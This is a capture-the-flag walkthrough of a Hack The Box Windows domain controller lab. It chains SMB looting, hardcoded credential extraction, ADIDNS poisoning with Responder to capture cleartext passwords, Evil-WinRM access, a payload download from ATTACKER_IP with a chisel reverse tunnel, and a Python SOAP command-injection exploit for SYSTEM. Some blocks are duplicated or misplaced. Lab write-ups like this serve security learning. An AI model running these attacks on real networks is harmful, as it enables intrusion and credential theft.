# Overwatch-HTB-Walkthrough
Hack The Box - Overwatch Machine Walkthrough (Medium Windows Domain Controller)

# 🎯 Overwatch – Hack The Box Walkthrough

| **Difficulty** | **OS** | **Player #** | **Date Completed** |
|----------------|--------|--------------|--------------------|
| Medium | Windows | 7,008 | May 2026 |

---

## 📋 Machine Summary

Overwatch is a Medium Windows Domain Controller machine that requires exploiting multiple vulnerabilities:

- **SMB Enumeration** – Hidden `software$` share with .NET monitoring application
- **Reverse Engineering** – Hardcoded SQL credentials in `overwatch.exe`
- **MSSQL Enumeration** – Linked server `SQL07` with self-mapping enabled
- **ADIDNS Poisoning** – DNS record manipulation to redirect `SQL07`
- **Responder** – Cleartext credential capture via NTLM authentication
- **WinRM Access** – Shell as `sqlmgmt` user
- **WCF/SOAP Command Injection** – `KillProcess` method vulnerable to PowerShell injection → **SYSTEM**

**Attack Chain:** SMB → .NET Reversing → MSSQL → ADIDNS Poisoning → Responder → WinRM → WCF Injection → Root

---

## 🔍 Enumeration

### Nmap Scansmbclient -L //<TARGET_IP> -N
smbclient //<TARGET_IP>/software$ -N
cd Monitoring
ls
get overwatch.exe
get overwatch.exe.config
get overwatch.pdb
exit

```bash
nmap -sS -sV -p- <TARGET_IP> -oN full_scan.txt

Open Ports (key services):

    53 (DNS), 88 (Kerberos), 135 (msrpc), 139/445 (SMB)

    389/636 (LDAP), 3389 (RDP), 5985 (WinRM)

    6520 (Microsoft SQL Server) – non-standard port

    8000 (HTTP) – WCF service (internal)

SMB Enumeration

smbclient -L //<TARGET_IP> -N
smbclient //<TARGET_IP>/software$ -N
cd Monitoring
ls
get overwatch.exe
get overwatch.exe.config
get overwatch.pdb
exit

Interesting files: overwatch.exe (.NET assembly), configuration file, and debug symbols.

💀 Foothold – .NET Reverse Engineering
Analyze the Binary

# Install mono-complete for monodis
sudo apt install mono-complete -y

# Disassemble the .NET executable
monodis overwatch.exe | grep -B 5 -A 5 "Password"

Hardcoded SQL Connection String found:

Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;

Credentials extracted:

    Username: sqlsvc

    Password: TI0LKcfHzZw1Vv

🗄️ MSSQL Enumeration
Connect to MSSQL (Port 6520)

# Install Impacket
sudo apt install python3-impacket -y

# Connect to MSSQL
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@<TARGET_IP> -port 6520

Enumerate Linked Servers
EXEC sp_linkedservers;
Result: Linked server SQL07 found with self-mapping enabled.

🎯 ADIDNS Poisoning
Step 1: Start Responder
sudo responder -I tun0 -v

Step 2: Add DNS Record for SQL07

# Find dnstool.py
find /usr -name "dnstool.py" 2>/dev/null

# Add A record pointing to attacker IP
python3 /usr/share/doc/python3-impacket/examples/dnstool.py -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' --action add --record SQL07 --data <ATTACKER_IP> --type A <TARGET_IP>

Step 3: Trigger Linked Server Query

EXEC ('SELECT @@version') AT SQL07;

Responder captures cleartext credentials:

[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx

🔑 WinRM Access – User Flag
Connect via Evil-WinRM

# Install evil-winrm
sudo gem install evil-winrm

# Connect
evil-winrm -i <TARGET_IP> -u sqlmgmt -p 'bIhBbzMMnB82yx'

# Install evil-winrm
sudo gem install evil-winrm

# Connect
evil-winrm -i <TARGET_IP> -u sqlmgmt -p 'bIhBbzMMnB82yx'

Get User Flag

cd C:\Users\sqlmgmt\Desktop
type user.txt

User Flag: ------------------
🐛 Privilege Escalation – WCF/SOAP Command Injection
Step 1: Forward Internal WCF Service (Port 8000)

On attacker machine – start Chisel server:

# Download chisel
wget https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz
gunzip chisel_1.10.0_linux_amd64.gz
chmod +x chisel_1.10.0_linux_amd64
mv chisel_1.10.0_linux_amd64 chisel

# Start server
./chisel server -p 9001 --reverse

On Windows target (via evil-winrm):

# Download chisel.exe
Invoke-WebRequest -Uri "http://<ATTACKER_IP>:8080/chisel.exe" -OutFile "chisel.exe" -UseBasicParsing

# Start client
.\chisel.exe client <ATTACKER_IP>:9001 R:8000:127.0.0.1:8000

Step 3: Exploit KillProcess Command Injection

Create Python exploit:

# exploit.py
import requests
import sys

TARGET = "http://127.0.0.1:8000/MonitorService"

def soap_request(process_name):
    body = f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <tns:KillProcess>
      <tns:processName>{process_name}</tns:processName>
    </tns:KillProcess>
  </soap:Body>
</soap:Envelope>'''

    headers = {
        "Content-Type": "text/xml; charset=utf-8",
        "SOAPAction": "http://tempuri.org/IMonitoringService/KillProcess"
    }
    r = requests.post(TARGET, data=body, headers=headers, timeout=10)
    print(r.text)

if len(sys.argv) > 1:
    cmd = sys.argv[1]
else:
    cmd = "whoami"

soap_request(f"x -ErrorAction Ignore; {cmd}; #")

Root Flag: ----------------------

📚 Tools Used
Tool	Purpose
nmap	Port scanning
smbclient	SMB enumeration
monodis	.NET disassembler
impacket (mssqlclient.py, dnstool.py)	MSSQL & ADIDNS manipulation
responder	Credential capture
evil-winrm	WinRM shell
chisel	Tunneling
python3 (requests)	SOAP exploit
🧠 Key Takeaways

    Always perform full port scans – 6520 (MSSQL) was missed initially

    monodis / strings can extract hardcoded credentials from .NET binaries

    ADIDNS poisoning allows redirecting internal hosts to attacker machine

    Responder can capture cleartext MSSQL authentication

    WCF services with command injection can lead to SYSTEM compromise

    Chisel reverse tunneling helps access internal services

📎 References

    Impacket

    Evil-WinRM

    Chisel

    Responder

